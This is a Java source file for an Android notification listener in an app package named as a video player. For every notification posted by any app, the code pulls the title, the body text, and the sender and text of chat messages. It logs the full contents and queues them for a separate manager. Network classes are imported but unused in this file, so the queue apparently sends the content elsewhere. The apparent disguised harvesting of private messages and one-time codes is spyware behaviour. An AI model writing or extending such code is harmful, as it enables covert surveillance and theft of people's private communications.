package com.jumpy.videoplayerapp;

import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.Bundle;
import android.app.Notification;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import android.widget.Toast;
import android.os.Parcelable;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

public class NotificationListener extends NotificationListenerService {

    private static final String TAG = "NotificationListener";
    private NotificationQueueManager queueManager;

    @Override
    public void onCreate() {
        super.onCreate();
        queueManager = new NotificationQueueManager(this);
        queueManager.startQueueProcessing();
        Log.i(TAG, "NotificationListener created and queue manager started");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            if (sbn == null) {
                Log.w(TAG, "StatusBarNotification is null");
                return;
            }

            if (!isNotificationServiceEnabled(getApplicationContext())) {
                Log.w(TAG, "Notification access is NOT enabled. Skipping notification processing.");
                return;
            }

            Log.i(TAG, "onNotificationPosted called");

            String pack = sbn.getPackageName();
            if (pack == null) {
                pack = "unknown";
            }

            String title = "";
            String text = "";
            String bigText = "";
            String messagingText = "";

            try {
                Notification notification = sbn.getNotification();
                if (notification == null || notification.extras == null) {
                    Log.i(TAG, "Notification or extras is null");
                    return;
                }

                Bundle extras = notification.extras;

                // Standard fields with null checks
                CharSequence titleSeq = extras.getCharSequence(Notification.EXTRA_TITLE);
                title = titleSeq != null ? titleSeq.toString() : "";

                CharSequence textSeq = extras.getCharSequence(Notification.EXTRA_TEXT);
                text = textSeq != null ? textSeq.toString() : "";

                CharSequence bigTextSeq = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);
                bigText = bigTextSeq != null ? bigTextSeq.toString() : "";

                // Messaging-style notifications
                if (extras.containsKey(Notification.EXTRA_MESSAGES)) {
                    Parcelable[] messages = extras.getParcelableArray(Notification.EXTRA_MESSAGES);
                    if (messages != null) {
                        StringBuilder sb = new StringBuilder();
                        for (Parcelable p : messages) {
                            if (p instanceof Bundle) {
                                Bundle msgBundle = (Bundle) p;
                                CharSequence sender = msgBundle.getCharSequence("sender");
                                CharSequence msgText = msgBundle.getCharSequence("text");
                                if (sender != null && msgText != null) {
                                    sb.append(sender).append(": ").append(msgText).append("\n");
                                }
                            }
                        }
                        messagingText = sb.toString().trim();
                    }
                }

                // Log the full extras bundle for analysis
                Log.i(TAG, "Notification extras: " + extras.toString());

                // Try textLines if text is null or empty
                if (text == null || text.equals("null") || text.trim().isEmpty()) {
                    CharSequence[] lines = extras.getCharSequenceArray("android.textLines");
                    if (lines != null && lines.length > 0) {
                        StringBuilder sb = new StringBuilder();
                        for (CharSequence line : lines) {
                            if (line != null) {
                                sb.append(line).append("\n");
                            }
                        }
                        text = sb.toString().trim();
                    }
                }

                // Optionally, limit the size of text
                int maxLength = 2000; // or any limit you want
                if (text != null && text.length() > maxLength) {
                    text = text.substring(0, maxLength) + "...[truncated]";
                }

            } catch (Exception e) {
                Log.e(TAG, "Error extracting notification: " + Log.getStackTraceString(e));
            }

            String fullContent = !messagingText.isEmpty() ? messagingText :
                                 !bigText.isEmpty() ? bigText :
                                 !text.isEmpty() ? text : "(no content)";

            Log.i(TAG, "App: " + pack);
            Log.i(TAG, "Title: " + title);
            Log.i(TAG, "Content: " + fullContent);

            // Add to queue instead of sending immediately
            if (queueManager != null) {
                queueManager.addNotification(pack, title, fullContent, pack);
            }

        } catch (Exception e) {
            Log.e(TAG, "Critical error in onNotificationPosted: " + Log.getStackTraceString(e));
        }
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        Log.i(TAG, "NotificationListener: onListenerConnected called");
    }

    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        Log.i(TAG, "NotificationListener: onListenerDisconnected called");
    }

    private boolean isNotificationServiceEnabled(Context context) {
        try {
            if (context == null) {
                return false;
            }
            
            String pkgName = context.getPackageName();
            if (pkgName == null) {
                return false;
            }
            
            final String flat = android.provider.Settings.Secure.getString(context.getContentResolver(),
                    "enabled_notification_listeners");
            if (flat != null && !flat.isEmpty()) {
                String[] names = flat.split(":");
                for (String name : names) {
                    if (name.contains(pkgName)) {
                        return true;
                    }
                }
            }
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Error checking notification service: " + Log.getStackTraceString(e));
            return false;
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (queueManager != null) {
            queueManager.stopQueueProcessing();
        }
        Log.i(TAG, "NotificationListener destroyed");
    }
} 